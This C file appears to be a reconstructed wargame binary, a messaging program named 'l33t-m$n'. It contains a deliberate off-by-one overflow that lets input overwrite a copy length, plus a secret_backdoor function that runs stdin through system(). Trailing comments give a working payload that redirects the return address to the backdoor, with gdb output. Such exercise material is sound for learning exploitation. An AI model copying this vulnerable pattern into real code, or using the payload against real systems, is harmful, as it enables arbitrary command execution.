# include <stdio.h>
# include <stdlib.h>
# include <string.h>


void	secret_backdoor(void)
{
	char	buffer[128];

	fgets(buffer, 128, stdin);
	system(buffer);
}


void	set_username(char *input /*rbp-0x98*/)
{
	char	buffer[128]; // rbp-0x90
	int		n; // rbp-0x4

	puts(">: Enter your username");
	printf(">>: ");
	fgets(buffer, 128, stdin);
	n = 0;
	while (n <= 40 && buffer[n]) {
		input[n + 140] = buffer[n];
		n++;
	}
	printf(">: Welcome, %s", input + 140);
}


void	set_msg(char *input /*rbp-0x408*/)
{
	char	buffer[1024];  // rbp-0x400

	puts(">: Msg @Unix-Dude");
	printf(">>: ");
	fgets(buffer, 1024, stdin);
	strncpy(input, buffer, *(input + 180));
}


void	handle_msg(void)
{
	char	buffer1[140]; // rbp-0xc0
	char	buffer2[40]; // rbp-0x34
	int		n = 140; // rbp-0xc

	set_username(buffer1);
	set_msg(buffer1);
	puts(">: Msg sent!");
}


int main(int ac, char **av, char **env)
{
	puts(
		"--------------------------------------------"
		"\n|   ~Welcome to l33t-m$n ~    v1337        |\n"
		"--------------------------------------------"
	);
	handle_msg();
	return 0;
}



//r < <(python -c 'print "\x90" * 40 + b"\xff"'; python -c 'print "\x90" * 200 + b"\x00\x00\x55\x55\x55\x55\x48\x8c"[::-1]')
//
//(gdb) info frame
//Stack level 0, frame at 0x7fffffffe4c0:
// rip = 0x555555554924 in handle_msg; saved rip 0x9090909090909090
// called by frame at 0x7fffffffe4c8
// Arglist at 0x7fffffffe4b0, args:
// Locals at 0x7fffffffe4b0, Previous frame's sp is 0x7fffffffe4c0
// Saved registers:
//  rbp at 0x7fffffffe4b0, rip at 0x7fffffffe4b8
//(gdb) x/wx $rsp
//0x7fffffffe3f0:	0x90909090
//
//(gdb) info func secret
//All functions matching regular expression "secret":
//
//Non-debugging symbols:
//0x000055555555488c  secret_backdoor
//...
